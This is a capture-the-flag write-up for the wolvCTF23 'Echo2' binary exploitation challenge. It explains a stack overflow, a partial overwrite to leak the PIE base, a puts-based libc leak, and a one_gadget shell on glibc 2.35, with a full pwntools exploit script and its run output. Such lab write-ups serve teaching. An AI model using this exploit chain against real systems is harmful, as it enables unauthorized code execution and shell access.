# Echo2

The description for this challenge is as follows:

*New and improved echo?*

The challenge included a netcat connection, a copy of the binary file, the libc file, and the Dockerfile. This was a reasonably straightforward challenge that required the player to work around PIE via partial overwrite, as well as perform a successful ret2libc attack. The main "twist" to this challenge is the fact that the binary was compiled on a system using libc 2.35, which, among other security improvements, typically compiles binaries without some of the more convenient gadgets for ROP-based attacks. 

*Side-Note"* The challenge binary I've uploaded here is the one used originally in the challenges. The echo2 binary has had patchelf applied to it in order to use the provided libc file and interpreter, assuming that they are downloaded and all placed in the same directory. I also reference echo2 in my solve script.

**TL;DR Solution:** Reverse-engineer the program to determine that the user controls the length of input onto the stack without any sort of bounds check, allowing and overflow. By controlling the length of input, the return pointer can be partially overflowed with one or more arbitrary bytes, without required nulls or newlines. Since the payload is also printed, a partial overflow into the return pointer can be used to return back into an earlier part of the main function, and that return pointer can also be printed to console, leaking the PIE base. On the next pass, since rdi is already set to an address containing a libc address, we can just create a short ROP chain that calls puts and returns back to echo again to get a libc leak. Then we can just use a onegadget to get a shell!

## Gathering Information

Firstly, we can do a strings analysis on the provided libc file to determine that it is version 2.35. You can set the binary up to use the libc on pretty much any Linux system using the steps I've outlined here: <https://github.com/knittingirl/CTF-Writeups/tree/main/ELF_Interpreters_and_Libcs>. You will also want to download the ld-2.35.so file.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23$ strings -n10 libc.so.6 | grep "2.3"
GLIBC_2.3.2
GLIBC_2.3.3
GLIBC_2.3.4
GLIBC_2.30
GLIBC_2.31
GLIBC_2.32
GLIBC_2.33
GLIBC_2.34
GLIBC_2.35
glibc 2.35
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
```
Simply running the binary does not seem to provide much information. It's taking some input, but it just seems to hang. Time for Ghidra!
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23$ ./echo2
Welcome to Echo2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
Ghidra's decompilation shows that this binary really just consists of two functions. There's main, which calls setvbuf on stdout, stderr, and stdin, calls the echo() function, and prints a string. The echo function itself is the really interesting one; here, we can see that after "Welcome to Echo2" is printed, there's a scanf of an int, and the read-in int is used to determine the length of a subsequent fgets call. This means that the length of our call to fgets is effectively unlimited, and since the read is into a stack vaiable, this gives us a really straightforward stack overflow.
```
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  echo();
  puts("Goodbye from Echo2");
  return 0;
}
void echo(void)

{
  undefined local_118 [264];
  int read_length;
  undefined4 local_c;
  
  puts("Welcome to Echo2");
  local_c = __isoc99_scanf("%d",&read_length);
  fread(local_118,1,(long)read_length,stdin);
  printf("Echo2: %s\n",local_118);
  return;
}
```
Now it's time to look at what protections might be causing problem! Checksec shows us that all of the protections beside canaries are enabled. Since NX is enabled, we'll have to use ROP, which shouldn't be *too* much of a problem. More concerning is the fact that PIE is enabled; PIE, or **position independent execution**, is a mitigation that applies ASLR to the code section of a binary, which means that the addresses in that section will be randomized at each run of the binary and we cannot easily jump directly to other addresses.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23$ checksec echo2
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23/echo2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```
## Evading PIE

One of the most common methods of dealing with the PIE protection is a partial overflow into existing addresses. PIE/ASLR doesn't actually randomize every part of an address; most important to this discussion is that the last three "nibbles" (hex digits) of any address will be consistent between runs, i.e. the address of the main function in this binary will always end with "247".

![image](https://user-images.githubusercontent.com/10614967/229815552-91519dce-14b9-4f52-98b8-a1435e41c2c7.png) 

Since we can tightly control the length of our reads, we can set ourselves up to read in the length of the padding plus a single overflow byte. In GEF, we can see that in a normal run of the program, after the echo function completes, we will return to main at 0x0000563f2bc302b3 (on one example run). The main function starts at 0x0000563f2bc30247, so we can return back to any other point in main with 100% accuracy. Since the payload we send is also printed to console, the printing will leak the PIE address to which we return, since functions like printf and puts print strings until a null byte is reached, so if we overflow directly into an address, the remaining bytes of that address will also be printed until the nulls are reached. If we then starts the program's execution over again, we can get a second shot at an overflow, but this time, we will know the base value of PIE and be able to fully use any addresses in the code section.
```
   0x0000563f2bc302ae <+103>:   call   0x563f2bc301c9 <echo>
   0x0000563f2bc302b3 <+108>:   lea    rax,[rip+0xd69]        # 0x563f2bc31023
   
   gef➤  disas main
Dump of assembler code for function main:
   0x0000563f2bc30247 <+0>:     endbr64
   0x0000563f2bc3024b <+4>:     push   rbp
   0x0000563f2bc3024c <+5>:     mov    rbp,rsp
   0x0000563f2bc3024f <+8>:     mov    rax,QWORD PTR [rip+0x2dca]        # 0x563f2bc33020 <stdout@GLIBC_2.2.5>
```


One thing to note is that if we just return directly to the start of main, we hit an error within the scanf call and the program segfaults. This happens on a movaps instruction, and this is a known issue in ROP, as described here: <https://ropemporium.com/guide.html>. The error occurs because of stack alignment issues; while the linked resource recommends adding extra padding ret instructions, we don't have that option here because of the necessity of partial overwrite. A decent alternative is to try returning after the push rbp instruction, which changes the way that the stack is aligned and seems to work nicely here. For some reason, returning after the calls to setvbuf can also sometimes work nicely when faced with similar situations.
```
 → 0x7fbc89adeae4                  movaps XMMWORD PTR [rbp-0x600], xmm1
 ```
 Here is the payload to manage the partial overflow and parse the PIE leak. 
 ```
 from pwn import *

target = process('./echo2')

pid = gdb.attach(target, 'b *echo+125\ncontinue')

elf = ELF('echo2')

print(target.recvuntil(b'Echo2\n'))

#Note: we have a persistent I/O issue whereby the newline from the scanf is being read by the fgets call. It was easiest to just compensate by decrementing padding length by one.
padding = b'a' * 279
payload = padding + b'\x4c'

target.sendline(str(len(payload)+1))

target.send(payload)

print(target.recvuntil(b'Echo2: '))

print(target.recv(280))
leak = target.recv(6)
print(leak)
main = u64(leak + b'\x00' * 2) - 5
print(hex(main))
pie_base = main - elf.symbols['main']


target.interactive()
 ```
 ## Ret2libc on 2.35
 
Since this is dynamically-compiled binary, the code section of the code only grants us access to functions used within the actual body of the binary. Since this does not include any calls to system/execve or similar, ways to open files like flag.txt, or syscall gadgets, we will need to access the more complete set of functions in the libc section. However, ASLR is applied to the libc section, so just like with PIE, we need to figure out the base address of libc to get additional addresses.
 
Traditionally, ret2libc works by loading a GOT entry (which contains libc addresses for the libc functions used in the binary) into the rdi register (which controls the first argument of a function in x86-64), calling puts or printf, and then restarting program execution again to get a new ROP chain using libc addresses; I have a more detailed writeup on that methodology here: <https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/Imaginary_CTF/speedrun>. The problem with that approach here is that the binary was compiled on a system using libc 2.35, such as Ubuntu 22. While I have yet to find formal documentation on this, I have observed that these binaries seem to be getting compiled without the __libc_csu_init function, which was responsible for the reliable presence of pop rdi and pop rsi gadgets, which could be used to control the first and second arguments of a function in a ROPchain quite easily (it also allowed for a ret2csu attack to control rdx and the third arguments). I strongly suspect that this function was removed as a security measure because of how helpful it was for ROP. The upshot of all this is that there is not a good way to control the value of rdi in this particular binary.

Fortunately, we get pretty lucky with this particular binary. If we inspect the value of rdi at the end of the echo function, which is where our ROPchain starts executing, we can see that it's a stack address that contains a libc address for the function "funlockfile". If we simply call puts or printf here, this libc address gets printed out, allowing us to find the base address of libc on the run, and use addresses in libc on our third and final run at the ROPchain. 
```
gef➤  x/gx $rdi
0x7ffd44dd5b80: 0x00007ff99cb310d0
gef➤  x/5i 0x00007ff99cb310d0
   0x7ff99cb310d0 <funlockfile>:        endbr64
   0x7ff99cb310d4 <funlockfile+4>:      mov    rdi,QWORD PTR [rdi+0x88]
   0x7ff99cb310db <funlockfile+11>:     mov    eax,DWORD PTR [rdi+0x4]
   0x7ff99cb310de <funlockfile+14>:     sub    eax,0x1
   0x7ff99cb310e1 <funlockfile+17>:     mov    DWORD PTR [rdi+0x4],eax
```
Here is a payload that can be added to the payload above to get the libc leak and run the ROP portion of the binary again (I simply returned directly to echo, which seemed to bypass the movaps issue). I'm printing execve so that we can look at the address in GDB and double-check that the leak is working properly.
```
libc = ELF('libc.so.6')
payload2 = padding
payload2 += p64(pie_base + elf.symbols['puts'])
payload2 += p64(pie_base + elf.symbols['echo'])
target.sendline(str(len(payload2)+1))
target.send(payload2)

print(target.recvuntil(b'Echo2: '))
print(target.recv(287))
leak = (target.recv(6))

funlockfile = (u64(leak+b'\x00' * 2))
libc_base = funlockfile - libc.symbols['funlockfile']
execve = libc_base + libc.symbols['execve']
print(hex(execve))
```
## Onegadget and Win

At this point, we can either gather all the gadgets in libc to run execve('/bin/sh', 0, 0), which is very doable, or we can try to see if any onegadgets would work instead. Onegadgets are addresses in a libc file that will spawn a shell if certain conditions are met, and are particularly useful in scenarios where we may only be able to use a single address. We can see that this binary theoretically has four possible onegadgets.
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23$ one_gadget libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
If I go ahead and test the constraints at the end of the echo function, I can see that the one at offset 0xebcf5 seems to be mostly met. The only issue is that rbp-0x78 is not necessarily writable. However, it's value is controlled by us; rbp will be 8 bytes directly before the ROPchain starts, so in this case, it's just 8 of our 'a' padding bytes, minux 0x78. This means that if I just stick the address for the bss section (a reliable writable section in a binary) plus 0x78 right before my ROPchain, the gadget should work!
```
➤  x/gx $rdx
0x0:    Cannot access memory at address 0x0
gef➤  x/gx $r10
0x0:    Cannot access memory at address 0x0
gef➤  x/gx $rbp-0x78
0x61616161616160e9:     Cannot access memory at address 0x61616161616160e9
```
Here is the final solve script:
```
from pwn import *

target = process('./echo2')

pid = gdb.attach(target, 'b *echo+125\ncontinue')

elf = ELF('echo2')
libc = ELF('libc.so.6')

print(target.recvuntil(b'Echo2\n'))

#Note: we have a persistent I/O issue whereby the newline from the scanf is being read by the fgets call. It was easiest to just compensate by decrementing padding length by one.
padding = b'a' * 279
payload = padding + b'\x4c'

target.sendline(str(len(payload)+1))

target.send(payload)

print(target.recvuntil(b'Echo2: '))

print(target.recv(280))
leak = target.recv(6)
print(leak)
main = u64(leak + b'\x00' * 2) - 5
print(hex(main))
pie_base = main - elf.symbols['main']

payload2 = padding
payload2 += p64(pie_base + elf.symbols['puts'])
payload2 += p64(pie_base + elf.symbols['echo'])
target.sendline(str(len(payload2)+1))
target.send(payload2)

print(target.recvuntil(b'Echo2: '))
print(target.recv(287))
leak = (target.recv(6))

funlockfile = (u64(leak+b'\x00' * 2))
libc_base = funlockfile - libc.symbols['funlockfile']
execve = libc_base + libc.symbols['execve']
print(hex(execve))
onegadget = libc_base + 0xebcf5

payload3 = b'b' * (279 - 8) + p64(pie_base + elf.bss() + 0x78)
payload3 += p64(onegadget)
target.sendline(str(len(payload3)+1))
target.send(payload3)

target.interactive()
```
And here is what that looks like when run:
```
knittingirl@DESKTOP-C54EFL6:/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23$ python3 echo2_writeup.py NOPTRACE
[+] Starting local process './echo2': pid 21569
[!] Skipping debug attach since context.noptrace==True
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23/echo2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
[*] '/mnt/c/Users/Owner/Desktop/CTF_Files/wolvCTF23/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'Welcome to Echo2\n'
echo2_writeup.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(len(payload)+1))
b'Echo2: '
b'\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
b'L\xb2N\xea\xdeU'
0x55deea4eb247
echo2_writeup.py:32: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(len(payload2)+1))
b'\nWelcome to Echo2\nEcho2: '
b'\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x94\xb0N\xea\xdeU\n'
0x7f702d2770f0
echo2_writeup.py:47: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.sendline(str(len(payload3)+1))
[*] Switching to interactive mode

Welcome to Echo2
Echo2:
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\x98\xe0N\xea\xdeU
$ cat flag.txt
flag{I_pwn3d_17}
```
Thanks for reading!
